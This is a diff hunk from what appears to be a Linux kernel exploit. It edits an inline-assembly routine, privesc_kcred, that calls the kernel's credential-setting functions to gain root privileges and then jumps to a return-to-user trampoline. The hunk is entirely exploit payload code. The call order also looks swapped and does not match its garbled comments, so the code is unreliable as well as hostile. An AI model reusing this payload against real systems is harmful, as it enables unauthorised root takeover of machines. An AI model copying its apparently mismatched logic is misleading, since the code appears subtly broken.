@@ -18,14 +18,14 @@ void privesc_kcred(void)
     __asm__ __volatile__ (
         ".intel_syntax noprefix;"
         // prepare_kernel_cred*/
-        "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
+        "movabs rax, " __stringify(commit_creds_addr) ";"
         "xor rdi, rdi;"
         "call rax;"
         "mov rdi, rax;"
         // commit_creds*/
-        "movabs rax, " __stringify(PREPARE_KERNEL_CRED_ADDR) ";"
+        "movabs rax, " __stringify(prepare_kernel_cred_addr) ";"
         "call rax;"
-        "mov rax, " __stringify(PRIVESC_JUMP_ADDR) ";"
+        "mov rax, " __stringify(post_privesc_jmp_addr) ";"
         // jmp to ret2user_trampoline or any return stub
         "jmp rax;"
         ".att_syntax;"
